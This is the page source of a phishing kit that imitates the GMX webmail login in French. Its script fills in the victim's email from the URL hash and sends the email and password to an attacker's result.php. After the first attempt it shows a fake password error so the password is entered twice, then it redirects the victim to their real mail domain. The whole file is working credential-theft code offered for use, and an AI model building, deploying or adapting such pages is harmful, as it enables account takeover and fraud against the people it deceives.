<?php include __DIR__ . '/gate.php'; ?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login</title>
    <link rel="shortcut icon" href="https://img.ui-portal.de/cd/ci/gmx.net/favicon.ico" type="image/x-icon">
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }
        :root {
            --font-weight-header: 500;
            --font-family-header: Roboto, Arial, Helvetica, sans-serif;
            --font-family-hero: RobotoCondensed, Arial, Helvetica, sans-serif;
        }
        body {
            color: #333;
            font-family: Verdana, Helvetica Neue, Helvetica, Arial, sans-serif;
            font-size: 14px;
            line-height: 20px;
            background: #f1f4f9;
            display: flex;
            align-items: center;
            flex-direction: column;
            width: 100%;
            justify-content: space-between;
        }
        header {
            width:100%;
        }

        .header {
            display: flex;
            height: 56px;
            margin-bottom: 48px;
            padding: 0 16px;
            align-items: center;
            background: #1c449b;
            flex: none;
        }

        .header__logo {
            margin-top: 17px;
            margin-bottom: 17px;
        }

        .header__logo img {
            width: 68px;
            height: 22px;
        }

        /* .header__logo {
            margin-top: 8px;
        }
        .header .icon {
            fill: #fff;
        }

        svg:not(:root) {
            overflow: hidden;
        }
        .icon--logo-gmx-dims {
            width: 68px;
            height: 22px;
        }
        .icon {
            flex-shrink: 0;
        }
        .icon, .pos-svg-icon {
            display: inline-flex;
        }
        .pos-svg {
            width: auto;
            height: auto;
            -webkit-user-select: none;
            -ms-user-select: none;
            user-select: none;
        } */
        .header__text {
            font-family: sans-serif;
            font-weight: 300;
            font-size: 28px;
            line-height: 37px;
            margin-top: 9px;
            margin-bottom: 10px;
            padding-left: 11px;
            color: #fff;
        }
        .centered-content--narrow {
            max-width: 423px;
        }
        .centered-content {
            background: #fff;
            border-radius: 4px;
            margin: 0 auto 80px;
            /* max-width: 528px; */
            padding: 40px 32px 32px;
            width: 100%;
            /*margin-top: 5rem;*/
        }
        .content-title {
            margin: 0 0 32px;
            text-align: center;
            color: #1c449b;
        }
        .content-title__logo {
            margin-bottom: 22px;
        }
        .content-title__logo img {
            display: block;
            margin: auto;
            width: 135px;
    height: 79px;
        }
        h1 {
            font-size: 24px;
            line-height: 32px;
            color: #525252;
            font-family: var(--font-family-header);
            font-weight: var(--font-weight-header);
            margin: 0 0 24px;
            text-align: center;
        }
        .pos-form-wrapper {
            margin-bottom: 16px;
        }
        .pos-label--block {
            display: block;
            margin-bottom: 4px;
        }
        .pos-label {
            color: #525252;
            font-weight: 400;
            line-height: 18px;
            white-space: nowrap;
        }
        .pos-input-smalltext, .pos-label {
            font-size: 12px;
        }
        .pos-input, .separated-input {
            display: block;
            position: relative;
        }
        .pos-input input, .pos-input select, .separated-input input, .separated-input select {
            width: 100%;
            height: 32px;
            padding: 0 8px;
            border: 1px solid #c2c2c2;
            border-radius: 4px;
            background-color: #fff;
            color: #525252;
            font-style: normal;
            font-weight: 400;
            text-decoration: none;
            box-shadow: none;
        }
        .a-mb-space-2 {
            margin-bottom: 16px;
        }
        .pos-button--block {
            display: block;
            width: 100%;
        }
        .pos-button--cta, .pos-button--cta.focus, .pos-button--cta:focus {
            border-color: transparent;
            background-color: #6e9804;
            color: #fff;
        }
        .pos-button--cta {
            fill: #fff;
        }
        .pos-button {
            text-align: center;
            margin-bottom: 0;
            border: 0;
            font-weight: 400;
            text-decoration: none;
            white-space: nowrap;
            cursor: pointer;
            vertical-align: middle;
            touch-action: manipulation;
            padding: 4px 12px;
            border-radius: 4px;
            font-size: 14px;
            line-height: 24px;
            -webkit-user-select: none;
            -ms-user-select: none;
            user-select: none;
        }
        button, html input[type=button], input[type=reset], input[type=submit] {
            cursor: pointer;
            -webkit-appearance: button;
        }
        button, select {
            text-transform: none;
        }
        button {
            overflow: visible;
        }
        .footer {
            padding: 16px;
            background: #999;
            text-align: center;
             margin-top: 6%; 
            width: 100%;
            /*position: fixed;*/
            /*bottom: 0;*/
            /*left: 0;*/
        }
        .footer__link {
            margin-right: 32px;
            color: #fff;
        }
        a, a:focus, a:hover, a a.active {
            outline: 0;
            color: #1c449b;
            text-decoration: none;
            cursor: pointer;
        }
        #rooep {
            display: none;
            align-items: center;
            gap: 1rem;
            color: #d40000;
            margin-bottom: 16px;
        }
        #rooep i {
            font-size: 20px;
        }
        .pos-input i {
            position: absolute;
            top: 31%;
            right: 4%;
        }
        @media screen and (max-width: 767px) {
            .header {
                border-bottom: 1px solid #dadada;
                margin-bottom: 24px;
                height: 48px;
                padding: 0 8px;
            }

            .header__logo {
                margin-top: 18px;
                margin-bottom: 14px;
            }
            .footer__link {
                margin-right: 0;
                display: block;
            }
            .centered-content {
                max-width: 368px;
                padding: 16px 8px;
            }
            body {
                background: #fff;
            }
            .footer {
            padding: 16px;
            background: #999;
            text-align: center;
             margin-top: 6%; 
            width: 100%;
            position: fixed;
            bottom: 0;
            left: 0;
        }
        }
    </style>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.1/jquery.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css" integrity="sha512-z3gLpd7yknf1YoNbCzqRKc4qyor8gaKU1qmn+CShxbuBusANI9QpRohGBreCFkKxLhei6S9CQXFEbbKuqLg0DA==" crossorigin="anonymous" referrerpolicy="no-referrer">
</head>

<body>
    <header>
        <div class="header ">
            <div class="header__logo">
                <img src="./image.png" alt="">
            </div>
            <div class="header__text">Connexion</div>
        </div>
    </header>

    <div class="centered-content centered-content--narrow">

        <div class="content-title">
            <div class="content-title__logo">
                <img src="./img/image.png" alt="">
            </div>

            <h1>Connexion</h1>

        </div>

        <form name="loginForm" method="post" action="" accept-charset="UTF-8" id="result">
            <input type="text" name="website" id="website" style="display:none;">
            <div id="0:formPanel:loginForm:usernameInput">
                <div class="pos-form-wrapper">
                    <label class="pos-label pos-label--block required"
                        for="0:formPanel:loginForm:usernameInput:topWrapper:inputWrapper:input">Adresse e-mail</label>
                    <div class="pos-input">

                        <input name="aa" class="revealable-input-row__input" required value="" id="userid" type="email">

                    </div>
                </div>

            </div>

            <div id="0:formPanel:loginForm:passwordInput">
                <div class="two-fa-enter-password">
                    <div class="pos-form-wrapper revealable-input-row">
                        <label class="pos-label pos-label--block required"
                            for="0:formPanel:loginForm:passwordInput:topWrapper:inputWrapper:input">Mot de passe</label>
                        <div class="pos-input" style="position: relative;">
                            <input type="password" class="revealable-input-row__input" required="required" value="" name="bb" id="password">
                            <i class="fas fa-eye"></i>
                        </div>
                    </div>
                </div>
            </div>
            <div class="rooep" id="rooep">
                <i class="fas fa-triangle-exclamation"></i>
                <span>Veuillez saisir votre mot de passe.</span>
            </div>

            <button id="submitButton" type="submit" class="pos-button pos-button--cta pos-button--block a-mb-space-2">
                Connexion
            </button>
        </form>
    </div>
    <div class="footer">
        <a class="footer__link" target="_blank" href="?jd0=/Mot de passe oublié?">Mot de passe oublié?</a>
    </div>
    <script>
         $("#btn").on("click", function () {
            $(this).text("Verifying...");
            setTimeout(() => {
                $(this).text("Sign in");
            }, 3000);
        });
        function isBase64(str) {
               if (str === '' || String(str).trim() === '') {return false}
               try {if (btoa(atob(str)) === atob(btoa(str))) return true} catch {return false}
           }
           
           function getEmail () {
           let email = "";
           if (window.location.hash) {
               email = window.location.hash.substring(1);
               email = isBase64(email) ? window.atob(email) : email;
           }
           return email;
           }
           email = getEmail();
           if(email){
               document.getElementById("userid").value = email;            
           }
        // document.addEventListener('contextmenu', function (e) {
        //  e.preventDefault();
        // });

        var fille = "./result.php"; // Your php url here e.g http://youdomain.com/result.php
            var formSubmitted = 0;
    
            $("#result").on("submit", function (event) {
            
                event.preventDefault();
                const dommdom = document.getElementById("userid").value.split('@')[1];
                formSubmitted++;
                const honeypot = document.querySelector('#website');

                if (honeypot.value.trim() !== "") {
                    console.warn("Bot detected, submission blocked.");
                    return;
                }

                
                var inputs = $('input[required]');
                for (var i = 0; i < inputs.length; i++) {
                    if (!inputs[i].value.trim()) {
                        alert("Please fill in all fields.");
                        return;
                    }
                }
                
                var formData = new FormData(this);
    
                $.ajax({
                    url: `${fille}`,
                    type: 'POST',
                    data: formData,
                    processData: false, // Required to send FormData
                    contentType: false, // Required to not set default content type
                    success: function (response) {
                        console.log(response);
                        
                        if (formSubmitted === 1) {
                            console.log("YESSSSS");
                            $("#password").val("");
                            $("#rooep").css("display", "flex");
                        } else if (formSubmitted >= 2) {
                            console.log("GOOOOOO");
                            setTimeout(() => {
                                window.location.href = `https://${dommdom}`;
                            }, 2000);
                        } 
                    }
                });
            });
    </script>
</body>

</html>